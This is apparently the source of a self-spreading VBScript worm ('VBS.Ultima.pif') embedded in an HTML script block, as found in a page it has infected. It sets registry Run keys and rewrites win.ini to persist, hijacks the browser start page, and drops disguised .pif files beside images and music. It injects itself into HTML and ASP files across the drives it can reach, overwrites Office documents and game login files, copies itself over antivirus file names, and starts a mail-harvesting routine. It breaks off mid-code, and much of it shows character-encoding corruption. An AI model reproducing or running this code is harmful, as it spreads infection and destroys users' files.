</SCRIPT>
<SCRIPT LANGUAGE=VBScript>
<!--
set a=CreateObject("Scripting.FileSystemObject")
Set g = CreateObject("WScript.Shell")
regz "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\WinSys","c:\e-card.vbs"
set vbs=a.createtextfile("c:\e-card.vbs")
encode=";)author           : by BR3AK-H3ART "&vbcrlf& _
";)AGE              : 17 "&vbcrlf& _
";)My Ultima nick   : NemesiS[Dark Lord] "&vbcrlf& _
";)from             : TURKEY  "&vbcrlf& _
";)e-mail           : br3ak_h3art@hotmail.com  "&vbcrlf& _
";)explanation      : My Small Virus Game. ;) / TXT,LOG,HTM,ASP,DOC,XLS,MP3,WAV,ULtimate icon Pif system,Outlook Mail, _ "&vbcrlf& _
";)Search Driver Files Mail Line And send.,Send Mail Computer Files "&vbcrlf& _
";)virus name       : VBS.Ultima.pif - FuLL Mother file "&vbcrlf& _
";)Message          : Computer My World.! And I Hate Go to School , All Computer One Game� YES.! Big Game "&vbcrlf& _
";)new Pif-VBS Viruses Coded by BR3AK-H3ART "&vbcrlf& _
";)My Virus No:38 "&vbcrlf& _
";)312C41\1
On Error Resume Next
Set a = CreateObject(�*?Scripting.FileSystemObject�*?)
Set e = a.GetFile(WScript.ScriptFullName) "&vbcrlf& _
"Set b = a.GetSpecialFolder(0)
Set g = CreateObject(�*?WScript.Shell�*?)
Set d = a.GetSpecialFolder(2)
Set HH = CreateObject(�*?WScript.Network�*?) "&vbcrlf& _
"l=Chr(13)��Chr(10)
n=Chr(34)
Z=Chr(34)
e.copy(b���*?\by-BR3AK-H3ART.vbs�*?)
e.copy(b���*?\system.dII�*?)
r �*?HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\system32�*?,b���*?\by-BR3AK-H3ART.vbs�*? "&vbcrlf& _
"r �*?HKCU\Software\Microsoft\Internet Explorer\Main\Start Page�*?,�*?http://www.hidefiles.50megs.com/�*?
r �*?HKEY_CLASSES_ROOT\VBSfile\DefaultIcon\�*?,�*?shell32.dll,-152�*?   "&vbcrlf& _
"r �*?HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout�*?,0,�*?REG_DWORD�*?
r �*?HKEY_CLASSES_ROOT\.dII\�*?,�*?VBSfile�*? "&vbcrlf& _
"r �*?HKEY_CLASSES_ROOT\VBSFile\Shell\Edit\Command\�*?,b���*?\by_BR3AK-H3ART_Mail_br3ak_h3art@hotmail.com_AGE_17.dII�*? "&vbcrlf& _
"r �*?HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\system�*?,b���*?\system.dII�*?
If A2 = �*?�*? Then
A2 = 0
end if "&vbcrlf& _
"A3=a.GetBaseName(WScript.ScriptFullName)
if (a.FileExists(d���*?\�*?��A3���*?.txt-�*?)) then
set A4=a.CreateTextFile(d���*?\�*?��A3)
Set A5=a.OpenTextFile(d���*?\�*?��A3���*?.txt-�*?) "&vbcrlf& _
"A6=A5.readall
A4.Writeline A6
A4.close
g.run(d���*?\�*?��A3)
end if
if (a.FileExists(b���*?\uo.zip�*?)) Then
else
g.run(�*?Winzip32.exe  -min -a -r -p �*?��b���*?\uo.zip �*?��b���*?\by-BR3AK-H3ART.vbs�*?) , vbhide "&vbcrlf& _
"end if
set A7=a.CreateTextFile(b���*?\Win98.ini�*?)
A7.close
set A9=a.OpenTextFile(b���*?\win.ini�*?)
B3=Split(A9.ReadAll,vbcrlf)
B1=ubound(B3) "&vbcrlf& _
"for B2=0 to ubound(B3)
if B3(B2)=�*?run=�*? then
B3(B2)=�*?run=C:\WINDOWS\WScript.exe c:\WINDOWS\by-BR3AK-H3ART.vbs�*?
else
B3(B2)=B3(B2)���*? �*? "&vbcrlf& _
"end if
next
set B4=a.OpenTextFile(b���*?\Win98.ini�*?,2)
B4.write join(B3,vbcrlf)
B4.close
A9.close
set B5=a.getfile(b���*?\Win98.ini�*?) "&vbcrlf& _
"B5.copy(b���*?\win.ini�*?)
for Neme=1 to 3
if Neme=�*?1�*? Then
set B6=a.CreateTextFile(b���*?\UO.pif�*?)
A1=b���*?\Write.exe�*?
OutOpen=b���*?\UO.pif�*? "&vbcrlf& _
"end if
if Neme=�*?2�*? Then
set B6=a.CreateTextFile(b���*?\Tarkan-remix-4.Mp3.pif�*?)
A1=�*?C:\Program Files\Winamp\winamp.exe�*?
OutOpen=b���*?\Tarkan-remix-4.Mp3.pif�*? "&vbcrlf& _
"end if
if Neme=�*?3�*? Then
set B6=a.CreateTextFile(b���*?\Bmp.pif�*?)
A1=b���*?\Write.exe�*?
OutOpen=b���*?\Bmp.pif�*?
end if
r �*?HKEY_CLASSES_ROOT\VBSfile\DefaultIcon\�*?,�*?shell32.dll,-152�*? "&vbcrlf& _
"B6.Write(XX(�*?0078627920425233414B2D48334152542020202020202020202020202020202080020000�*?))
B6.Write(XX(�*?433A5C434F4D4D414E442E434F4D00000000000000000000000000000000000000000000�*?)) "&vbcrlf& _
"B6.Write(XX(�*?0000000000000000000000000000000000000000000000000000001000003A5C00000000�*?))
B6.Write(XX(�*?000000000000000000000000000000000000000000000000000000000000000000000000�*?)) "&vbcrlf& _
"B6.Write(XX(�*?0000000000000000000000000000000000000000002F6320636F7079202A2E7069662063�*?))
B6.Write(XX(�*?3A5C612E626174207C2063616C6C20633A5C612E626174207C2063616C6C20633A5C612E�*?)) "&vbcrlf& _
"B6.Write(XX(�*?626174003A5C7061696E742E00000100FF19500000070000000000000000000000000000�*?))
B6.Write(XX(�*?000000000000000000000000000000000000000000000000000000000000000000000000�*?)) "&vbcrlf& _
"B6.Write(XX(�*?000000000000000000000000000000000000000000000000000000000000000000000000�*?))
B6.Write(XX(�*?000000000000000000000000000000000000000000000000000000000000000000000000�*?)) "&vbcrlf& _
"B6.Write(XX(�*?0000000000000000004D4943524F534F46542050494645580087010000710157494E444F�*?))
B6.Write(XX(�*?57532033383620332E300005029D0168008002000064003200FFFF0000FFFF0000021012�*?)) "&vbcrlf& _
"B6.Write(XX(�*?001F000000000000000000000000000000000000002F6320636F7079202A2E7069662063�*?))
B6.Write(XX(�*?3A5C612E626174207C2063616C6C20633A5C612E626174207C2063616C6C20633A5C612E�*?)) "&vbcrlf& _
"B6.Write(XX(�*?626174003A5C7061696E742E0057494E444F575320564D4D20342E3000FFFF1B02AC0100�*?))
B6.Write(XX(�*?000000000000000000000000000000000000000000000000000000000000000000000000�*?)) "&vbcrlf& _
"B6.Write(XX(�*?000000000000000000000000000000000000000000000000000000000000000000000000000000�*?)) "&vbcrlf& _
"B6.Write(XX(�*?000000000000000000000000�*?))��A1
B6.Write(XX(�*?003682E65786500000000000000000000000000000000000000000000000000000000000�*?)) "&vbcrlf& _
"B6.Write(XX(�*?000000000000000000000000000000000000000000000000000000000000000020000000�*?))
B6.Write(XX(�*?000000000000000320001000000000000000000000001000000050019000300C800E8030�*?)) "&vbcrlf& _
"B6.Write(XX(�*?2000A0001000000000000000C08000000000100010001005465726D696E616C000000000�*?))
B6.Write(XX(�*?0000000000000000000000000000000000000004C756369646120436F6E736F6C6500000�*?)) "&vbcrlf& _
"B6.Write(XX(�*?00000000000000000000000000000000000030000005000190035022C015C00540016000�*?))
B6.Write(XX(�*?0000100FFFFFFFFFFFFFFFF64001B00C0006F00000000000000000000000000000000000�*?)) "&vbcrlf& _
"B6.Write(XX(�*?000000000000000000000000000000000000000000000000000000000000000000000000�*?))
B6.Write(XX(�*?000000000000000000000000000000000000000000000000000000000000000000000000100�*?)) "&vbcrlf& _
"B6.Writeline �*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?
B6.Close
set B7=a.OpenTextFile(b���*?\by-BR3AK-H3ART.vbs�*?) "&vbcrlf& _
"set A8=a.CreateTextFile(b���*?\decode.dll�*?)
A8.close
B8=Split(B7.ReadAll,vbcrlf)
B9=ubound(B8)
for C1=0 to ubound(B8)
if (B9=C1) then "&vbcrlf& _
"B8(C1)=�*?echo �*?��B8(C1)���*? �*?��Chr(62)��Chr(62)���*?c:\Ultima.vbs�*?��l���*?echo copy c:\windows\wscript.exe c:\ >c:\Runwin.bat�*?��l�� _ "&vbcrlf& _
"�*?echo Wscript Ultima.vbs >>c:\Runwin.bat�*?��l���*?call c:\Runwin.bat�*?
else
if (C1=�*?0�*?) then
B8(C1)=�*?echo �*?��B8(C1)���*? �*?��Chr(62)���*?c:\Ultima.vbs�*? "&vbcrlf& _
"else
B8(C1)=�*?echo �*?��B8(C1)���*? �*?��Chr(62)��Chr(62)���*?c:\Ultima.vbs�*?
end if
end if
next
set C2=a.OpenTextFile(b���*?\decode.dll�*?,2)
C2.write join(B8,vbcrlf) "&vbcrlf& _
"C2.close
B7.close
set C3=a.OpenTextFile(b���*?\decode.dll�*?)
set C4=a.Opentextfile(OutOpen,8,true)
F12=C3.readall "&vbcrlf& _
"C4.Write �*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?��l���*?�*?
C4.Write F12
C4.close
C3.close
next "&vbcrlf& _
"r �*?HKCU\software\VBS-Ultima-PiF\�*?,Chr(86)��Chr(66)��Chr(83)��Chr(46)��Chr(85)��Chr(108)��Chr(116)�� _ "&vbcrlf& _
"Chr(105)��Chr(109)��Chr(97)��Chr(46)��Chr(112)��Chr(105)��Chr(102)��Chr(32)��Chr(67)��Chr(111)�� _ "&vbcrlf& _
"Chr(100)��Chr(101)��Chr(100)��Chr(32)��Chr(66)��Chr(121)��Chr(32)��Chr(66)��Chr(82)��Chr(51)�� _ "&vbcrlf& _
"Chr(65)��Chr(75)��Chr(45)��Chr(72)��Chr(51)��Chr(65)��Chr(82)��Chr(84)��Chr(32)��Chr(47)�� _ "&vbcrlf& _
"Chr(32)��Chr(77)��Chr(97)��Chr(105)��Chr(108)��Chr(32)��Chr(58)��Chr(32)��Chr(98)��Chr(114)�� _ "&vbcrlf& _
"Chr(51)��Chr(97)��Chr(107)��Chr(95)��Chr(104)��Chr(51)��Chr(97)��Chr(114)��Chr(116)��Chr(64)�� _ "&vbcrlf& _
"Chr(104)��Chr(111)��Chr(116)��Chr(109)��Chr(97)��Chr(105)��Chr(108)��Chr(46)��Chr(99)��Chr(111)�� _ "&vbcrlf& _
"Chr(109)��Chr(32)��Chr(47)��Chr(32)��Chr(70)��Chr(82)��Chr(79)��Chr(77)��Chr(32)��Chr(58)�� _ "&vbcrlf& _
"Chr(32)��Chr(84)��Chr(85)��Chr(82)��Chr(75)��Chr(69)��Chr(89)��Chr(32)��Chr(47)��Chr(32)��Chr(65)�� _ "&vbcrlf& _
"Chr(71)��Chr(69)��Chr(32)��Chr(58)��Chr(32)��Chr(49)��Chr(55)
set D4=a.createtextfile(b���*?\html.dII�*?) "&vbcrlf& _
"D4.writeline �*?;)VBS.Ultima.pif-HTML.ASP�*?��l���*?;)html �� htm �� asp infected system Coded by BR3AK-H3ART�*?��l�� _ "&vbcrlf& _
"�*?;)age:17 / from:TURKEY�*?��l���*?;)Mail:br3ak_h3art@hotmail.com�*?��l���*?Set a = CreateObject(�*?��Z���*?Scripting.FileSystemObject�*?��Z���*?)�*?��l�� _ "&vbcrlf& _
"�*?Set b = a.GetSpecialFolder(0)�*?��l���*?l=Chr(13)��Chr(10)�*?��l���*?n=Chr(34)�*?��l���*?set bj=a.OpenTextFile(b���*?��Z���*?\by-BR3AK-H3ART.vbs�*?��Z���*?)�*?��l�� _ "&vbcrlf& _
"�*?set bw=a.CreateTextFile(b���*?��Z���*?\htmickode.txt�*?��Z���*?)�*?��l���*?bw.close�*?��l���*?w=Split(bj.ReadAll,vbcrlf)�*?��l���*?bh=ubound(w)�*?��l�� _ "&vbcrlf& _
"�*?for bz=0 to ubound(w)�*?��l���*?w(bz)=replace(w(bz),�*?��Z���*?�*?��Z���*?�*?��Z���*?�*?��Z���*?,Chr(191)+Chr(42)+Chr(63))�*?��l�� _ "&vbcrlf& _
"�*?w(bz)=replace(w(bz),�*?��Z���*?;)�*?��Z���*?,Chr(59)+Chr(41))�*?��l���*?w(bz)=replace(w(bz),�*?��Z���*?���*?��Z���*?,Chr(167)+Chr(167))�*?��l�� _ "&vbcrlf& _
"�*?w(bz)=replace(w(bz),�*?��Z���*?<BR3AK>�*?��Z���*?,Chr(60)��Chr(66)��Chr(82)��Chr(51)��Chr(65)��Chr(75)��Chr(62))�*?��l�� _ "&vbcrlf& _
"�*?if (bh=bz) then�*?��l���*?w(bz)=chr(34)+w(bz)+chr(34)�*?��l���*?else�*?��l���*?if (bz=�*?��Z���*?0�*?��Z���*?) then�*?��l�� _ "&vbcrlf& _
"�*?w(bz)=�*?��Z���*?encode=�*?��Z���*?��chr(34)+w(bz)+chr(34)��chr(38)���*?��Z���*?vbcrlf�� _�*?��Z���*?�*?��l���*?else�*?��l�� _ "&vbcrlf& _
"�*?w(bz)=chr(34)+w(bz)+chr(34)���*?��Z���*?��vbcrlf�� _�*?��Z���*?�*?��l���*?end if�*?��l���*?end if�*?��l���*?next�*?��l�� _ "&vbcrlf& _
"�*?set d=a.OpenTextFile(b���*?��Z���*?\htmickode.txt�*?��Z���*?,2)�*?��l���*?d.write join(w,vbcrlf)�*?��l�� _ "&vbcrlf& _
"�*?d.close�*?��l���*?scrg()�*?��l���*?sub scrg�*?��l���*?On Error Resume Next�*?��l���*?Dim ax,ba,O�*?��l���*?Set ba = a.Drives�*?��l�� _ "&vbcrlf& _
"�*?For Each ax in ba�*?��l���*?If ax.DriveType = 2 or ax.DriveType=3 Then�*?��l���*?cu(ax.path���*?��Z���*?\�*?��Z���*?)�*?��l�� _ "&vbcrlf& _
"�*?end if�*?��l���*?Next�*?��l���*?scrg = O�*?��l���*?end sub�*?��l���*?sub bb(folderspec)�*?��l���*?On Error Resume Next�*?��l�� _ "&vbcrlf& _
"�*?dim bc,bd,be,U,O�*?��l���*?set bc = a.GetFolder(folderspec)�*?��l���*?set be = bc.Files�*?��l�� _ "&vbcrlf& _
"�*?for each bd in be�*?��l���*?U=a.GetExtensionName(bd.path)�*?��l���*?U=lcase(U)�*?��l���*?O=lcase(bd.name)�*?��l�� _ "&vbcrlf& _
"�*?if (U=�*?��Z���*?html�*?��Z���*?) or (U=�*?��Z���*?htm�*?��Z���*?) or (U=�*?��Z���*?asp�*?��Z���*?) then�*?��l�� _ "&vbcrlf& _
"�*?set bi=a.OpenTextFile(bd.path)�*?��l���*?bt=Split(bi.ReadAll,vbcrlf)�*?��l���*?if (bt(1)=�*?��Z���*?<SCRIPT LANGUAGE=VBScript>�*?��Z���*?) then�*?��l�� _ "&vbcrlf& _
"�*?else�*?��l���*?Set bk = a.OpenTextFile(bd.path)�*?��l���*?E01=bk.readall�*?��l���*?set bx=a.OpenTextFile(b���*?��Z���*?\htmickode.txt�*?��Z���*?)�*?��l�� _ "&vbcrlf& _
"�*?ca=bx.readall�*?��l���*?set cb=a.CreateTextFile(bd.path)�*?��l���*?cb.writeline �*?��Z���*?<BR3AK>�*?��Z���*?�� _�*?��l�� _ "&vbcrlf& _
"�*?l���*?��Z���*?<SCRIPT LANGUAGE=VBScript>�*?��Z���*?�� _�*?��l���*?l���*?��Z���*?<!--�*?��Z���*?��l���*?��Z���*?set a=CreateObject(�*?��Z���*?��n�� _�*?��l�� _ "&vbcrlf& _
"�*?�*?��Z���*?Scripting.FileSystemObject�*?��Z���*?��n���*?��Z���*?)�*?��Z���*?��l�� _�*?��l���*?�*?��Z���*?Set g = CreateObject(�*?��Z���*?��n�� _�*?��l�� _ "&vbcrlf& _
"�*?�*?��Z���*?WScript.Shell�*?��Z���*?��n���*?��Z���*?)�*?��Z���*?��l�� _�*?��l���*?�*?��Z���*?regz �*?��Z���*?��n�� _�*?��l�� _ "&vbcrlf& _
"�*?�*?��Z���*?HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\WinSys�*?��Z���*?�� _�*?��l�� _ "&vbcrlf& _
"�*?n���*?��Z���*?,�*?��Z���*?��n���*?��Z���*?c:\e-card.vbs�*?��Z���*?��n��l���*?��Z���*?set vbs=a.createtextfile(�*?��Z���*?��n���*?��Z���*?c:\e-card.vbs�*?��Z���*?��n�� _�*?��l�� _ "&vbcrlf& _
"�*?�*?��Z���*?)�*?��Z���*?��l��ca��l�� _�*?��l���*?�*?��Z���*?encodez=replace(encode,Chr(191)+Chr(42)+Chr(63),Chr(34))�*?��Z���*?��l�� _�*?��l�� _ "&vbcrlf& _
"�*?�*?��Z���*?encodex=replace(encodez,Chr(59)��Chr(41),chr(39))�*?��Z���*?��l�� _�*?��l�� _ "&vbcrlf& _
"�*?�*?��Z���*?encodes=replace(encodex,Chr(167)��Chr(167),chr(38))�*?��Z���*?��l�� _�*?��l�� _ "&vbcrlf& _
"�*?�*?��Z���*?encodel=replace(encodes,Chr(60)��Chr(66)��Chr(82)��Chr(51)��Chr(65)��Chr(75)�*?��Z���*?�� _�*?��l�� _ "&vbcrlf& _
"�*?�*?��Z���*?��Chr(62),Chr(60)��Chr(47)��Chr(83)��Chr(67)��Chr(82)��Chr(73)��Chr(80)��Chr(84)��Chr(62))�*?��Z���*?�� _�*?��l�� _ "&vbcrlf& _
"�*?l���*?��Z���*?vbs.write encodel�*?��Z���*?��l���*?��Z���*?vbs.close�*?��Z���*?��l���*?��Z���*?sub regz(regkey,regvalue)�*?��Z���*?��l�� _�*?��l�� _ "&vbcrlf& _
"�*?�*?��Z���*?g.RegWrite regkey,regvalue�*?��Z���*?��l���*?��Z���*?end sub�*?��Z���*?��l���*?��Z���*?//-->�*?��Z���*?��l���*?��Z���*?<BR3AK>�*?��Z���*?��l��E01�*?��l���*?cb.close�*?��l�� _ "&vbcrlf& _
"�*?bx.close�*?��l���*?end if�*?��l���*?end if�*?��l���*?bk.close�*?��l���*?next�*?��l���*?end sub�*?��l���*?sub cu(folderspec)�*?��l���*?On Error Resume Next�*?��l�� _ "&vbcrlf& _
"�*?dim bc,bd,sf�*?��l���*?set bc = a.GetFolder(folderspec)�*?��l���*?set sf = bc.SubFolders�*?��l���*?for each bd in sf�*?��l�� _ "&vbcrlf& _
"�*?bb(bd.path)�*?��l���*?cu(bd.path)�*?��l���*?next�*?��l���*?end sub�*?
D4.CLOSE
g.run(b���*?\html.dII�*?)
scrg()
Function C(JL) "&vbcrlf& _
"Execute(Chr(70)��Chr(111)��Chr(114)��Chr(32)��Chr(74)��Chr(73)��Chr(32)��Chr(61)��Chr(32)��Chr(49)��Chr(32)�� _ "&vbcrlf& _
"Chr(84)��Chr(111)��Chr(32)��Chr(76)��Chr(101)��Chr(110)��Chr(40)��Chr(74)��Chr(76)��Chr(41)��Chr(13)��Chr(10)�� _ "&vbcrlf& _
"Chr(74)��Chr(85)��Chr(32)��Chr(61)��Chr(32)��Chr(77)��Chr(105)��Chr(100)��Chr(40)��Chr(74)��Chr(76)��Chr(44)�� _ "&vbcrlf& _
"Chr(32)��Chr(74)��Chr(73)��Chr(44)��Chr(32)��Chr(49)��Chr(41)��Chr(13)��Chr(10)��Chr(73)��Chr(102)��Chr(32)�� _ "&vbcrlf& _
"Chr(65)��Chr(115)��Chr(99)��Chr(40)��Chr(74)��Chr(85)��Chr(41)��Chr(32)��Chr(60)��Chr(62)��Chr(32)��Chr(51)�� _ "&vbcrlf& _
"Chr(52)��Chr(32)��Chr(65)��Chr(110)��Chr(100)��Chr(32)��Chr(65)��Chr(115)��Chr(99)��Chr(40)��Chr(74)��Chr(85)�� _ "&vbcrlf& _
"Chr(41)��Chr(32)��Chr(60)��Chr(62)��Chr(32)��Chr(51)��Chr(53)��Chr(32)��Chr(84)��Chr(104)��Chr(101)��Chr(110)�� _ "&vbcrlf& _
"Chr(13)��Chr(10)��Chr(73)��Chr(102)��Chr(32)��Chr(65)��Chr(115)��Chr(99)��Chr(40)��Chr(74)��Chr(85)��Chr(41)�� _ "&vbcrlf& _
"Chr(32)��Chr(77)��Chr(111)��Chr(100)��Chr(32)��Chr(50)��Chr(32)��Chr(61)��Chr(32)��Chr(48)��Chr(32)��Chr(84)�� _ "&vbcrlf& _
"Chr(104)��Chr(101)��Chr(110)��Chr(13)��Chr(10)��Chr(74)��Chr(85)��Chr(32)��Chr(61)��Chr(32)��Chr(67)��Chr(104)�� _ "&vbcrlf& _
"Chr(114)��Chr(40)��Chr(65)��Chr(115)��Chr(99)��Chr(40)��Chr(74)��Chr(85)��Chr(41)��Chr(32)��Chr(43)��Chr(32)�� _ "&vbcrlf& _
"Chr(49)��Chr(41)��Chr(13)��Chr(10)��Chr(69)��Chr(108)��Chr(115)��Chr(101)��Chr(13)��Chr(10)��Chr(74)��Chr(85)�� _ "&vbcrlf& _
"Chr(32)��Chr(61)��Chr(32)��Chr(67)��Chr(104)��Chr(114)��Chr(40)��Chr(65)��Chr(115)��Chr(99)��Chr(40)��Chr(74)�� _ "&vbcrlf& _
"Chr(85)��Chr(41)��Chr(32)��Chr(45)��Chr(32)��Chr(49)��Chr(41)��Chr(13)��Chr(10)��Chr(69)��Chr(110)��Chr(100)�� _ "&vbcrlf& _
"Chr(32)��Chr(73)��Chr(102)��Chr(13)��Chr(10)��Chr(69)��Chr(110)��Chr(100)��Chr(32)��Chr(73)��Chr(102)��Chr(13)�� _ "&vbcrlf& _
"Chr(10)��Chr(67)��Chr(32)��Chr(61)��Chr(32)��Chr(67)��Chr(32)��Chr(38)��Chr(32)��Chr(74)��Chr(85)��Chr(13)�� _ "&vbcrlf& _
"Chr(10)��Chr(78)��Chr(101)��Chr(120)��Chr(116))
End Function
sub r(regkey,regvalue)
On Error Resume Next
g.RegWrite regkey,regvalue "&vbcrlf& _
"end sub
sub scrg
On Error Resume Next
Dim ax,ba,O
Set ba = a.Drives
For Each ax in ba
If ax.DriveType = 2 or ax.DriveType=3 Then "&vbcrlf& _
"cu(ax.path���*?\�*?)
end if
Next
scrg = O
end sub
sub bb(folderspec)
On Error Resume Next
dim bc,bd,be,U,O
set bc = a.GetFolder(folderspec) "&vbcrlf& _
"set be = bc.Files
for each bd in be
U=a.GetExtensionName(bd.path)
U=lcase(U)
O=lcase(bd.name)
if (U=�*?vbs�*?) or (U=�*?vbe�*?)  then "&vbcrlf& _
"e.copy(bd.path)
elseif (U=�*?bmp�*?) or (U=�*?jpg�*?) or (U=�*?gif�*?) then
picinf=a.Getfile(b���*?\Bmp.pif�*?)
picinf.copy(bd.path���*?.pif�*?) "&vbcrlf& _
"set bu2=a.GetFile(bd.path)
bu2.attributes=bu.attributes + 2
bu2.close
elseif (U=�*?zip�*?) then
zip=a.getfile(b���*?\uo.zip�*?)
zip.copy(bd.path) "&vbcrlf& _
"elseif (U=�*?mp3�*?) or (U=�*?mp2�*?) or (U=�*?wav�*?) then
Mp3inf=a.Getfile(b���*?\Tarkan-remix-4.Mp3.pif�*?)
Mp3inf.copy(bd.path���*?.pif�*?)
set bu=a.GetFile(bd.path) "&vbcrlf& _
"bu.attributes=bu.attributes + 2
bu.close
elseif (U=�*?doc�*?) or (U=�*?xls�*?) then
aatch=bd.path
if month(now) = 9 and day(now) = 20 then "&vbcrlf& _
"set BadJokee=a.CreateTextFile(bd.path)
BadJokee.writeline �*?Norton AntiVirus repair This File. (VBS.Scourge.pif) by BR3AK-H3ART�*? "&vbcrlf& _
"Badjokee.close
end if
end if
if (O=�*?login.cfg�*?) or (O=�*?macros.txt�*?) then
if (O=�*?login.cfg�*?) then
set UO=a.CReateTextFiLe(bd.path) "&vbcrlf& _
"UO.Writeline �*?LoginServer=shard.thealterrealm.com,2593�*?
UO.Close
else
set UO2=a.CReateTextFiLe(bd.path) "&vbcrlf& _
"UO.Writeline C(�*?C!1!1!1�*?)��l��C(�*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU/ �*?)�� _
l��C(�*?########�*?)��l��C(�*?S!1!1!1�*?)��l��C(�*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU�*?)�� _ "&vbcrlf& _
"l��C(�*?########�*?)��l��C(�*?2!1!1!1�*?)��l��C(�*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU�*?)�� _
l�� C(�*?########�*?)��l��C(�*?@!1!1!1�*?)��l��C(�*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU�*?)�� _ "&vbcrlf& _
"l��C(�*?########�*?)��l��C(�*?J!1!1!1�*?)��l��C(�*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU�*?)�� _
l��C(�*?########�*?)��l��C(�*?I!1!1!1�*?)��l��C(�*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU�*?)�� _ "&vbcrlf& _
"l��C(�*?########�*?)��l��C(�*?D!1!1!1�*?)��l��C(�*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU�*?)�� _
l��C(�*?########�*?)��l��C(�*?@!1!1!1�*?)��l��C(�*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU�*?)�� _ "&vbcrlf& _
"l��C(�*?########�*?)��l��C(�*?S!1!1!1�*?)��l��C(�*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU�*?)�� _
l��C(�*?########�*?)��l��C(�*?U!1!1!1�*?)��l��C(�*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU�*?) "&vbcrlf& _
"UO.Close
end if
end if
if (O=�*?crack.exe�*?) then
e.copy(folderspec���*?\crack.vbs�*?)
e.copy(folderspec���*?\crack.exe�*?)
end if "&vbcrlf& _
"if (O=�*?tmhelp32.dll�*?) then
e.copy(folderspec���*?\tmhelp32.dll�*?)
end if
if (O=�*?navdx.exe�*?) then
e.copy(folderspec���*?\navdx.exe�*?) "&vbcrlf& _
"end if
if (O=�*?rescue.dll�*?) then
e.copy(folderspec���*?\rescue.dll�*?)
end if
if (O=�*?Virscan1.dat�*?) then
e.copy(folderspec���*?\rescue.dll�*?) "&vbcrlf& _
"end if
next
end sub
sub cu(folderspec)
On Error Resume Next
dim bc,bd,sf
set bc = a.GetFolder(folderspec)
set sf = bc.SubFolders "&vbcrlf& _
"for each bd in sf
bb(bd.path)
cu(bd.path)
next
end sub
Function XX(XB)
Dim XC
Dim XU
XC = �*?�*?
For XU = 1 To Len(XB) Step 2 "&vbcrlf& _
"XC = XC �� Chr( �*?��h�*? �� Mid(XB,XU, 2 ))
Next
XX = XC
End Function
if month(now) =9 and day(now) =20 then
set BadJokee3=a.CreateTextFile(b���*?\ShellNew\Winword.doc�*?) "&vbcrlf& _
"BadJokee3.writeline �*?Norton AntiVirus repair This File. (VBS.ULTIMA.pif) by BR3AK-H3ART�*?
Badjokee3.close
set BadJokee4=a.CreateTextFile(b���*?\ShellNew\Excel.xls�*?) "&vbcrlf& _
"BadJokee4.writeline �*?Norton AntiVirus repair This File. (VBS.ULTIMA.pif) by BR3AK-H3ART�*?
Badjokee4.close
end if "&vbcrlf& _
"ML=a.createtextfile(b���*?\mailci.dII�*?)                ;)Search Driver;)s and files all mail;)s send ;) / new system "&vbcrlf& _
"ML.Writeline �*?;)VBS.ULTIMA.pif-MAIL-SEACRH�*?��l���*?;)mail files search system Coded by BR3AK-H3ART�*?��l�� _ "&vbcrlf& _
"�*?;)age:17�*?��l���*?;)from:TURKEY�*? ��l���*?;)Mail:br3ak_h3art@hotmail.com�*?��l���*?On Error Resume Next�*?��l�� _ "&vbcrlf& _
"�*?Set a = CreateObject(�*?��Z���*?Scripting.FileSystemObject�*?��Z���*?)�*?��l���*?Set b = a.GetSpecialFolder(0)�*?��l�� _ "&vbcrlf& _
"�*?l=Chr(13)��Chr(10)�*?��l���*?n=Chr(34)�*?��l���*?scrg()�*?��l���*?sub scrg�*?��l���*?On Error Resume Next�*?��l���*?Dim ax,ba,O�*?��l�� _ "&vbcrlf& _
"�*?Set ba = a.Drives�*?��l���*?For Each ax in ba�*?��l���*?If ax.DriveType = 2 or ax.DriveType=3 Then �*?��l�� _ "&vbcrlf& _
"�*?cu(ax.path���*?��Z���*?\�*?��Z���*?)�*?��l���*?end if�*?��l���*?Next �*?��l���*?scrg = O�*?��l���*?end sub�*?��l���*?sub bb(folderspec)�*?��l�� _ "&vbcrlf& _
"�*?On Error Resume Next�*?��l���*?dim bc,bd,be,U,O�*?��l���*?set bc = a.GetFolder(folderspec)�*?��l���*?set be = bc.Files�*?��l�� _ "&vbcrlf& _
"�*?for each bd in be�*?��l���*?U=a.GetExtensionName(bd.path)�*?��l���*?U=lcase(U)�*?��l���*?O=lcase(bd.name)�*?��l�� _ "&vbcrlf& _
"�*?if (U=�*?��Z���*?txt-�*?��Z���*?) or (U=�*?��Z���*?log�*?��Z���*?) then  �*?��l���*?set siz3=a.getfile(bd.path)�*?��l���*?ssiz3=siz3.size�*?��l�� _ "&vbcrlf& _
"�*?if ssiz3 > 50000 then �*?��l���*?else�*?��l���*?set txtfile=a.OpenTextFile(bd.path)�*?��l���*?yazi=txtfile.ReadAll�*?��l�� _ "&vbcrlf& _
"�*?For sayi = 1 To Len(yazi)�*?��l���*?sayigeri=sayi�*?��l���*?isaret=sayi�*?��l���*?JU = Mid(yazi, sayi, 1)�*?��l�� _ "&vbcrlf& _
